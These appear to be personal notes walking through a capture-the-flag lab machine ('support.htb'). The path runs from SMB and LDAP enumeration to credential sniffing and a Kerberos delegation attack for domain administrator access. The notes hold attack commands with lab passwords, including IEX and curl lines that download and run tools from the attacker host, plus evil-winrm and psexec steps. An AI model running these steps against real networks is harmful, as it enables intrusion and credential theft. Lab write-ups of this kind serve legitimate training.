#Enumeration #nmap 

`sudo nmap -sC -v -sV -oA nmap/support 10.10.11.174`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`
`-v for verbose`

![[Pasted image 20250103205409.png]]

#smbenumeration with #crackmapexec 

`cme smb 10.10.11.174`

![[Pasted image 20250103205930.png]]

Name of the box: DC domain: support.htb

Enumerate shares:
`cme smb 10.10.11.174 --shares`

Enumerate shares with null authentication:

`cme smb 10.10.11.174 --shares -u '' -p ''`

![[Pasted image 20250103210301.png]]

Anonymous authentication:

`cme smb 10.10.11.174 --shares -u 'DoesNotExist' -p ''`

![[Pasted image 20250103210333.png]]
`support-tools` is non-standard share. 

Enumerate this share with #smbclient 

`smbclient -N //10.10.11.174/support-tools`

![[Pasted image 20250103210527.png]]
The `UserInfo.exe.zip` stick out so let's grab this. 

![[Pasted image 20250103210704.png]]
Create a directory to unzip the file into. 

![[Pasted image 20250103210800.png]]
Based on dlls..assuming this is a .NET application

Verifying with #file utility

`file UserInfo.exe`

![[Pasted image 20250103210920.png]]

Assuming installation of .NET framework..we can execute .exes on linux.

Executing `./UserInfo.exe`

![[Pasted image 20250103211220.png]]
See `Connect Error`

Open #wireshark to see what's going on

`sudo wireshark`

Select "any" adapter

Filter on #dns

![[Pasted image 20250103211418.png]]
Add `support.htb` to `/etc/hosts`

Re-run user info and get `No Such Object`

![[Pasted image 20250103211542.png]]

On Wireshark, we see a bind request 

(tun0 adapter)
![[Pasted image 20250103211649.png]]

Right click and follow stream. See password in plain text.

![[Pasted image 20250103211911.png]]
Copy password value

Running #crackmapexec again using this password and ldap user

`cme smb 10.10.11.174 --shares -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO'

![[Pasted image 20250103212452.png]]
Let's run #pythonbloodhoundingestor  

![[Pasted image 20250103212954.png]]

Received an error. 

Adding `dc.support.htb` to `etc/hosts` to try to resolve error.

![[Pasted image 20250103213312.png]]
Starting #neo4j

`sudo ./neo4j console`

![[Pasted image 20250103213421.png]]
Start #Bloodhound 

Don't see any ways to priv esc. 

Re-running #pythonbloodhoundingestor with `-c all` flag

`python3 bloodhound.py --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO' -c all`

![[Pasted image 20250103214056.png]]
Go back to bloodhound web app and drop in additional files.

Discovering the Shared Support Account has GenericAll against the DC.

No good attack paths found with bloodhound. 

Trying to find a path with #ldapsearch 

`ldapsearch -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO' -b 'dc=support, dc=htb > ldap.out'

![[Pasted image 20250103214823.png]]

CN=support

Found password here. 

![[Pasted image 20250104205102.png]]
The password was an attribute within active directory which is common for shared accounts. In the "info" field.

Test creds with #crackmapexec 

`cme smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful '` 

![[Pasted image 20250104205501.png]]
Mark "support" user as owned in Bloodhound. 

Go to "analysis" and review Shortest Paths again. 

Discover the support user can psremote to the domain controller. 

![[Pasted image 20250104205702.png]]
Go to Outbound Object Control to see what this user can do.

![[Pasted image 20250104205825.png]]
This user has "GenericAll" against the DC.

![[Pasted image 20250104205910.png]]
Go to Abuse Info

![[Pasted image 20250104205945.png]]
In this attack, we're going to create a new machine account with a password. We can sign tickets with this account. Get the SID of this account. Add this ability "AllowedToActOnBehalfOfOtherIdentity" which allows this account to sign kerberos tickets for other users other than itself. 

![[Pasted image 20250104210442.png]]
Now we can forge a ticket that comes from this machine saying that we're administrator.

Downloading dependencies:

1. [[Powermad]]
https://github.com/Kevin-Robertson/Powermad
2. [[PowerSploit]]
https://github.com/PowerShellMafia/PowerSploit
Download the `dev` branch
We want #powerview from the recon directory
`PowerView.ps1`
3. [[Rubeus]]
https://github.com/Flangvik/SharpCollection

Serve up `powermad.ps1`, `PowerView.ps1`, and `Rubeus.exe` using #pythonhttpserver 

Make `www` directory. 

`python3 -m http.server`

Let's use #evilwinrm to remote in

`evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful`

![[Pasted image 20250104212520.png]]

Download these files into `programdata` using #curl for the .exe and #IEX for the .ps1 scripts

`curl 10.10.14.8:8000/Rubeus.exe -o Rubeus.exe`

`IEX(New-Object Net.WebClient).downloadString ('http://10.10.14.8:8000/Powermad.ps1')`

`IEX(New-Object Net.WebClient).downloadString ('http://10.10.14.8:8000/PowerView.ps1')`

![[Pasted image 20250104212900.png]]
Verifying that we can create machine accounts (we can create 10)

`Get-DomainObject -Identity 'DC=SUPPORT,DC-HTB' | select ms-ds-machineaccountquota`

![[Pasted image 20250104213045.png]]
Follow steps from Bloodhound for the GenericAll Abuse. 

Got this ticket after much flailing/ because of evilwinrm. The Bloodhound stuff didn't work?

![[Pasted image 20250104214325.png]]
Copying the ticket to our machine and then converting it from KIRBI to CCNAME format and using PSEXEC

Remove all spaces from pasted ticket using `:%s/ //g`

Using #impacket `ticketconverter.py` 

Convert ticket from base64 to .kirbi

Convert .kirbi to .ccache

![[Pasted image 20250104214852.png]]
Use this .ccache ticket with #psexec 

`KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb`

![[Pasted image 20250104215149.png]]

![[Pasted image 20250104215046.png]]
Installing DotNet on a linux machine

Google "install powershell linux"

https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux?view=powershell-7.4

Each version of ubuntu has its own distro. 

Running through these steps to install PowerShell

![[Pasted image 20250104220342.png]]

Run `apt search dotnet`

Install `runtime-deps-7.0`

![[Pasted image 20250104220644.png]]

`sudo apt install dotnet-runtime-deps-7.0`

![[Pasted image 20250104220744.png]]
Install `sdk-7.0`

`sudo apt install dotnet-sdk-7.0`

![[Pasted image 20250104220911.png]]
`sudo apt search mono`

`sudo apt install mono-complete`

![[Pasted image 20250104221204.png]]
